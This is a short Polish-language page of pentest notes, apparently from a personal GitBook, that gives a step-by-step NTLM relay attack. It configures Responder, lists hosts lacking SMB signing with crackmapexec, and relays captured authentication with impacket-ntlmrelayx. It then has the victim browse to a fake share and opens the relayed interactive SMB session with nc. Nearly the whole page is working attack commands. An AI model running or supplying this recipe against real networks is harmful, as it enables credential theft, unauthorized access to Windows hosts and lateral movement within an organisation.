---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# połączenie Respondera i NTLMRelayX Kali

{% code overflow="wrap" fullWidth="true" %}
```python
#edycja pliku konfiguracyjnego
vim /etc/responder/Responder.conf
SMB = Off

#sprawdzamy hosty, które nie potrzebują SMB signing (potem możemy sprawdzić plik targetczy zawiera dobre komputery do ataku)
crackmapexec smb 10.20.10.0/24 --gen-relay-list target.txt

#właczamy respondera żeby odpowiadał
responder -I eth0 -v
```
{% endcode %}

{% code fullWidth="true" %}
```python
#na drugiej konsoli
impacket-ntlmrelayx -tf target.txt -smb2support -i
```
{% endcode %}

na Windowsie w exploratorze wpisujemy jakiś adres smb np \\\fileserver234 i Responder odpowie

w Kali powinien być komunikat Authenticating against…SUCCEED

i podany jest poniżej port na którym mamy się połaczyć

```python
nc 127.0.0.1 11000
```
